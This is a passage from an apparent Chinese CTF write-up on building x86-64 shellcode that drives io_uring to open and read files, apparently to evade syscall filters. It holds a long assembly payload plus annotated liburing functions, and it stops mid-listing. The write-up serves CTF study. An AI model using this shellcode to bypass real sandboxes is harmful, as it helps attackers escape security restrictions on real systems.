<p>在上面的C文件中，我们可以看到，有一些封装好的函数可以帮助我们与共享内存空间进行交互。那么在我们写shellcode的时候，就可以通过使用静态编译的C程序将这些函数提取出来，放在我们的shellcode后面，这样就能够在shellcode中直接使用这些封装函数，而不需要我们直接对内存空间进行操作，这样不仅省时，还能减少错误。</p>
<p>下面，我们就来尝试将上面的C程序变成shellcode。</p>
<p>我们将上面的程序进行静态编译，可以提取出下面几个较简单的封装函数的汇编代码，由于代码篇幅较大，这里省略展示：</p>
<ul>
<li><code>io_uring_get_sqe</code></li>
<li><code>io_uring_prep_openat</code></li>
<li><code>io_uring_prep_rw</code>（被<code>io_uring_prep_openat</code>调用）</li>
<li><code>io_uring_submit</code></li>
<li><code>_io_uring_flush_sq</code>（被<code>io_uring_submit</code>调用）</li>
<li><code>_io_uring_submit</code>（被<code>io_uring_submit</code>调用）</li>
</ul>
<p>除此之外，还有一些比较复杂的函数，如<code>io_uring_wait_cqe</code>等，将其转换为汇编语言的代码长度可能较长。</p>
<p>值得注意的是，由于<code>io_uring</code>在本质上是异步的IO系统，因此如果<code>io_uring</code>在向控制台输出内容后不久程序就会结束，有很大的可能会出现看不到输出的情况。这是正常现象，多试几次就能够出现回显内容。</p>
<p>不过从总体上来看，这段代码的汇编长度还是太长。下面，我们来参考一下su-team师傅的<a target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/">wp</a>，分析一下这篇wp中这段汇编代码的流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></td><td class="code"><pre><span class="line">lea    rax,[rip+0x3f9-7]</span><br><span class="line">xor    edx,edx</span><br><span class="line">push   0x1</span><br><span class="line">pop    rdi</span><br><span class="line">movq   xmm2,rax</span><br><span class="line">sub    rsp,0x108</span><br><span class="line">lea    rbx,[rsp+0x20]</span><br><span class="line">lea    rbp,[rsp+0x40]</span><br><span class="line">movq   xmm0,rbx</span><br><span class="line">push   rbp</span><br><span class="line">pop    rsi</span><br><span class="line">lea    r12,[rsp+0x18]</span><br><span class="line">punpcklqdq xmm0,xmm2</span><br><span class="line">movaps XMMWORD PTR [rsp],xmm0</span><br><span class="line">sub    rsp,0x88</span><br><span class="line">push   rdx</span><br><span class="line">pop    r9</span><br><span class="line">push   rdi</span><br><span class="line">pop    r8</span><br><span class="line">push   0xf</span><br><span class="line">pop    rcx</span><br><span class="line">xor    eax,eax</span><br><span class="line">push   rsp</span><br><span class="line">pop    rdx</span><br><span class="line">push   rdx</span><br><span class="line">pop    rdi</span><br><span class="line">rep stos QWORD PTR es:[rdi],rax</span><br><span class="line">push   r8</span><br><span class="line">pop    rdi</span><br><span class="line">push   r12</span><br><span class="line">push   rbp</span><br><span class="line">push   rdx</span><br><span class="line">pop    rbp</span><br><span class="line">push   rbx</span><br><span class="line">mov    rbx,rsi</span><br><span class="line">mov    rsi,rdx</span><br><span class="line">sub    rsp,0x10</span><br><span class="line">mov    esi,edi</span><br><span class="line">push   0x1a9</span><br><span class="line">pop    rdi</span><br><span class="line">call   syscall_func</span><br><span class="line">pop    r15</span><br><span class="line">lea    rdi,[rbx+0x8]</span><br><span class="line">mov    r12d,eax</span><br><span class="line">and    rdi,0xfffffffffffffff8</span><br><span class="line">mov    QWORD PTR [rbx],0x0</span><br><span class="line">mov    rdx,rbx</span><br><span class="line">mov    QWORD PTR [rbx+0xd0],0x0</span><br><span class="line">mov    ecx, 26</span><br><span class="line">rep stos QWORD PTR es:[rdi],rax</span><br><span class="line">lea    rcx,[rbx+0x68]</span><br><span class="line">mov    edi,r12d</span><br><span class="line">mov    r13d,edi</span><br><span class="line">push   r12</span><br><span class="line">mov    r12,rcx</span><br><span class="line">push   rbp</span><br><span class="line">mov    rbp,rdx</span><br><span class="line">push   rbx</span><br><span class="line">mov    rbx,rsi</span><br><span class="line">push   r15</span><br><span class="line">mov    edx,DWORD PTR [rsi]</span><br><span class="line">mov    eax,DWORD PTR [rsi+0x40]</span><br><span class="line">mov    esi,DWORD PTR [rsi+0x4]</span><br><span class="line">lea    rax,[rax+rdx*4]</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x64]</span><br><span class="line">shl    rsi,0x4</span><br><span class="line">mov    QWORD PTR [rbp+0x48],rax</span><br><span class="line">add    rsi,rdx</span><br><span class="line">mov    QWORD PTR [rcx+0x38],rsi</span><br><span class="line">mov    rsi,QWORD PTR [rbp+0x48]</span><br><span class="line">mov    QWORD PTR [r12+0x38],rsi</span><br><span class="line">mov    r8d,r13d</span><br><span class="line">push   0x8001</span><br><span class="line">pop    rcx</span><br><span class="line">push   0x3</span><br><span class="line">pop    rdx</span><br><span class="line">xor    edi,edi</span><br><span class="line">call   mmap64_func</span><br><span class="line">mov    QWORD PTR [rbp+0x50],rax</span><br><span class="line">mov    QWORD PTR [r12+0x40],rax</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x28]</span><br><span class="line">mov    esi,DWORD PTR [rbx]</span><br><span class="line">mov    r9d,0x10000000</span><br><span class="line">mov    r8d,r13d</span><br><span class="line">push   0x8001</span><br><span class="line">pop    rcx</span><br><span class="line">shl    rsi,0x6</span><br><span class="line">push   0</span><br><span class="line">pop    r15</span><br><span class="line">loop1:</span><br><span class="line">    add    rdx,rax</span><br><span class="line">    mov    QWORD PTR [rbp+r15*8],rdx</span><br><span class="line">    mov    edx,DWORD PTR [rbx+0x2c+r15*4]</span><br><span class="line">    inc    r15</span><br><span class="line">    cmp    r15, 6</span><br><span class="line">    jnz loop1</span><br><span class="line">add    rax,rdx</span><br><span class="line">push   0x3</span><br><span class="line">pop    rdx</span><br><span class="line">mov    QWORD PTR [rbp+0x30],rax</span><br><span class="line">call   mmap64_func</span><br><span class="line">mov    QWORD PTR [rbp+0x38],rax</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x50]</span><br><span class="line">mov    rax,QWORD PTR [r12+0x40]</span><br><span class="line">push   0</span><br><span class="line">pop    r13</span><br><span class="line">push   0</span><br><span class="line">pop    r15</span><br><span class="line">loop2:</span><br><span class="line">    add    rdx,rax</span><br><span class="line">    mov    QWORD PTR [r12+r15*8],rdx</span><br><span class="line">    mov    edx,DWORD PTR [rbx+0x54+r15*4]</span><br><span class="line">    inc    r15</span><br><span class="line">    cmp    r15, 4</span><br><span class="line">    jnz loop2</span><br><span class="line">add    rdx,rax</span><br><span class="line">mov    QWORD PTR [r12+0x28],rdx</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x64]</span><br><span class="line">add    rdx,rax</span><br><span class="line">mov    QWORD PTR [r12+0x30],rdx</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x68]</span><br><span class="line">add    rax,rdx</span><br><span class="line">mov    QWORD PTR [r12+0x20],rax</span><br><span class="line">pop    r15</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">mov    r13d,eax</span><br><span class="line">mov    eax,DWORD PTR [rbp+0x8]</span><br><span class="line">mov    DWORD PTR [rbx+0xc4],r12d</span><br><span class="line">mov    DWORD PTR [rbx+0xc0],eax</span><br><span class="line">mov    eax,DWORD PTR [rbp+0x14]</span><br><span class="line">mov    DWORD PTR [rbx+0xc8],eax</span><br><span class="line">pop    r15</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">add    rsp,0x88</span><br><span class="line">push   rbp</span><br><span class="line">pop    rdi</span><br><span class="line">call   io_uring_get_sqe_func</span><br><span class="line">pxor   xmm1,xmm1</span><br><span class="line">movdqa xmm0,XMMWORD PTR [rsp]</span><br><span class="line">movabs rcx,0xffffffff0000001c</span><br><span class="line">movaps XMMWORD PTR [rsp+0x20],xmm1</span><br><span class="line">mov    QWORD PTR [rsp+0x30],0x0</span><br><span class="line">mov    QWORD PTR [rax],rcx</span><br><span class="line">mov    QWORD PTR [rax+0x18],0x18</span><br><span class="line">mov    QWORD PTR [rax+0x20],0x0</span><br><span class="line">mov    QWORD PTR [rax+0x28],0x0</span><br><span class="line">movups XMMWORD PTR [rax+0x8],xmm0</span><br><span class="line">pxor   xmm0,xmm0</span><br><span class="line">movups XMMWORD PTR [rax+0x30],xmm0</span><br><span class="line">call   io_uring_submit_func</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    ecx,0x1</span><br><span class="line">mov    rsi,r12</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">call   __io_uring_get_cqe_func</span><br><span class="line">mov    rax,QWORD PTR [rsp+0x18]</span><br><span class="line">xor    r9d,r9d</span><br><span class="line">xor    edi,edi</span><br><span class="line">mov    rdx,QWORD PTR [rsp+0xa8]</span><br><span class="line">mov    ecx,0x2</span><br><span class="line">mov    esi,0x30</span><br><span class="line">mov    r8d,DWORD PTR [rax+0x8]</span><br><span class="line">mov    eax,DWORD PTR [rdx]</span><br><span class="line">add    eax,0x1</span><br><span class="line">mov    DWORD PTR [rdx],eax</span><br><span class="line">mov    edx,0x3</span><br><span class="line">call   mmap64_func</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">mov    QWORD PTR [rsp+0x28],0x40</span><br><span class="line">mov    QWORD PTR [rsp+0x20],rax</span><br><span class="line">call   io_uring_get_sqe_func</span><br><span class="line">pxor   xmm0,xmm0</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">movabs rsi,0x100000002</span><br><span class="line">mov    QWORD PTR [rax],rsi</span><br><span class="line">mov    QWORD PTR [rax+0x8],0x0</span><br><span class="line">mov    QWORD PTR [rax+0x10],rbx</span><br><span class="line">mov    QWORD PTR [rax+0x18],0x1</span><br><span class="line">mov    QWORD PTR [rax+0x20],0x0</span><br><span class="line">mov    QWORD PTR [rax+0x28],0x0</span><br><span class="line">movups XMMWORD PTR [rax+0x30],xmm0</span><br><span class="line">call   io_uring_submit_func</span><br><span class="line">xor    r8d,r8d</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    ecx,0x1</span><br><span class="line">mov    rsi,r12</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">call   __io_uring_get_cqe_func</span><br><span class="line"></span><br><span class="line">io_uring_get_sqe_func:</span><br><span class="line">mov    rax,QWORD PTR [rdi]</span><br><span class="line">xor    r8d,r8d</span><br><span class="line">mov    ecx,DWORD PTR [rax]</span><br><span class="line">mov    eax,DWORD PTR [rdi+0x44]</span><br><span class="line">lea    edx,[rax+0x1]</span><br><span class="line">mov    esi,edx</span><br><span class="line">sub    esi,ecx</span><br><span class="line">mov    rcx,QWORD PTR [rdi+0x18]</span><br><span class="line">mov    rcx,QWORD PTR [rdi+0x10]</span><br><span class="line">and    eax,DWORD PTR [rcx]</span><br><span class="line">mov    DWORD PTR [rdi+0x44],edx</span><br><span class="line">shl    rax,0x6</span><br><span class="line">add    rax,QWORD PTR [rdi+0x38]</span><br><span class="line">mov    r8,rax</span><br><span class="line">mov    rax,r8</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">io_uring_submit_func:</span><br><span class="line">push   r15</span><br><span class="line">mov    r10,QWORD PTR [rdi+0x8]</span><br><span class="line">mov    edx,DWORD PTR [rdi+0x40]</span><br><span class="line">mov    r8d,DWORD PTR [rdi+0x44]</span><br><span class="line">mov    eax,DWORD PTR [r10]</span><br><span class="line">sub    r8d,edx</span><br><span class="line">mov    rcx,QWORD PTR [rdi+0x10]</span><br><span class="line">mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">add    r8d,eax</span><br><span class="line">mov    ecx,DWORD PTR [rcx]</span><br><span class="line">nop    DWORD PTR [rax+0x0]</span><br><span class="line">mov    esi,eax</span><br><span class="line">and    edx,ecx</span><br><span class="line">add    eax,0x1</span><br><span class="line">and    esi,ecx</span><br><span class="line">mov    DWORD PTR [r9+rsi*4],edx</span><br><span class="line">mov    edx,DWORD PTR [rdi+0x40]</span><br><span class="line">add    edx,0x1</span><br><span class="line">mov    DWORD PTR [rdi+0x40],edx</span><br><span class="line">mov    DWORD PTR [r10],eax</span><br><span class="line">mov    rdx,QWORD PTR [rdi]</span><br><span class="line">sub    eax,DWORD PTR [rdx]</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    esi,eax</span><br><span class="line">mov    eax,DWORD PTR [rdi+0xc0]</span><br><span class="line">mov    ecx,eax</span><br><span class="line">and    ecx,0x2</span><br><span class="line">mov    r8d,ecx</span><br><span class="line">or     r8d,0x1</span><br><span class="line">test   al,0x1</span><br><span class="line">cmovne ecx,r8d</span><br><span class="line">mov    edi,DWORD PTR [rdi+0xc4]</span><br><span class="line">mov    r9,r8</span><br><span class="line">mov    r8d,ecx</span><br><span class="line">mov    ecx,edx</span><br><span class="line">mov    edx,esi</span><br><span class="line">mov    esi,edi</span><br><span class="line">mov    edi,0x1aa</span><br><span class="line">push   r15</span><br><span class="line">push   0x8</span><br><span class="line">call   syscall_func</span><br><span class="line">pop    rdx</span><br><span class="line">pop    rcx</span><br><span class="line">pop    r15</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">syscall_func:</span><br><span class="line">mov    rax,rdi</span><br><span class="line">mov    rdi,rsi</span><br><span class="line">mov    rsi,rdx</span><br><span class="line">mov    rdx,rcx</span><br><span class="line">mov    r10,r8</span><br><span class="line">mov    r8,r9</span><br><span class="line">mov    r9,QWORD PTR [rsp+0x8]</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">__io_uring_get_cqe_func:</span><br><span class="line">sub    rsp,0x28</span><br><span class="line">mov    DWORD PTR [rsp],edx</span><br><span class="line">mov    rdx,rsp</span><br><span class="line">movabs rax,0x800000000</span><br><span class="line">mov    DWORD PTR [rsp+0x4],ecx</span><br><span class="line">mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">mov    QWORD PTR [rsp+0x10],r8</span><br><span class="line">push   r13</span><br><span class="line">mov    r13,rsi</span><br><span class="line">push   r12</span><br><span class="line">mov    r12,rdx</span><br><span class="line">push   rbp</span><br><span class="line">mov    rbp,rdi</span><br><span class="line">push   rbx</span><br><span class="line">push   r15</span><br><span class="line">nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">mov    rax,QWORD PTR [rbp+0x78]</span><br><span class="line">mov    esi,DWORD PTR [rax]</span><br><span class="line">mov    rax,QWORD PTR [rbp+0x70]</span><br><span class="line">mov    edx,DWORD PTR [rax]</span><br><span class="line">mov    rcx,QWORD PTR [rbp+0x68]</span><br><span class="line">mov    eax,DWORD PTR [rcx]</span><br><span class="line">sub    edx,eax</span><br><span class="line">mov    ebx,esi</span><br><span class="line">and    ebx,eax</span><br><span class="line">shl    rbx,0x4</span><br><span class="line">add    rbx,QWORD PTR [rbp+0x98]</span><br><span class="line">mov    esi,DWORD PTR [r12]</span><br><span class="line">xor    r8d,r8d</span><br><span class="line">mov    QWORD PTR [r13+0x0],rbx</span><br><span class="line">add    rsp,0x8</span><br><span class="line">mov    eax,r8d</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">add    rsp,0x28</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mmap64_func:</span><br><span class="line">mov    r10d,ecx</span><br><span class="line">push   0x9</span><br><span class="line">pop    rax</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>首先是对其中一些库函数的实现。这部分内容大多是对库函数的直接复制或小幅度修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> io_uring_sqe *<span class="title function_">io_uring_get_sqe</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line">	<span class="type">unsigned</span> next = sq-&gt;sqe_tail + <span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * All sqes are used</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (next - sq-&gt;sqe_head &gt; *sq-&gt;kring_entries)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	sqe = &amp;sq-&gt;sqes[sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask];</span><br><span class="line">	sq-&gt;sqe_tail = next;</span><br><span class="line">	<span class="keyword">return</span> sqe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在wp中，将跳转标号和比较指令删除了。从源码可以看出，判断的功能是判断队列有没有满，在本题中我们实际上是不需要这个判断的，因此我们实际上还能够对wp中的汇编代码进行进一步的精简：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">io_uring_get_sqe_func:</span><br><span class="line">mov rax, [rdi]      ; rax = ring-&gt;sq</span><br><span class="line">mov ecx, [rax]      ; ecx = sq-&gt;sqe_head</span><br><span class="line">mov eax, [rdi+0x44] ; eax = sq-&gt;sqe_tail</span><br><span class="line">lea edx, [rax+1]    ; edx = rax + 1 == next</span><br><span class="line">mov rcx, [rdi+0x10] ; rcx = sq-&gt;kring_mask</span><br><span class="line">and eax, [rcx]      ; eax = sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask</span><br><span class="line">mov [rdi+0x44], edx ; sq-&gt;sqe_tail = next</span><br><span class="line">shl rax, 6          ; rax = sizeof(io_uring_sqe) * (sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask)</span><br><span class="line">add rax, [rdi+0x38] ; rax = &amp;sq-&gt;sqes[sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>下面的<code>io_uring_submit</code>的改编也就是将原来的函数调用扁平化，去掉了所有的call以及跳转，让整段代码顺序执行。通过代码不难发现，提交任务的操作实际上是通过<code>io_uring_enter</code>这个系统调用实现的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">			     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">			flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line">		<span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">			flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">		ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">					   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ret = submitted;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> __io_uring_flush_sq(<span class="keyword">struct</span> io_uring *ring)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line">	<span class="type">unsigned</span> tail = sq-&gt;sqe_tail;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sq-&gt;sqe_head != tail) &#123;</span><br><span class="line">		sq-&gt;sqe_head = tail;</span><br><span class="line">		<span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">			IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			io_uring_smp_store_release(sq-&gt;ktail, tail);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tail - *sq-&gt;khead;</span><br><span 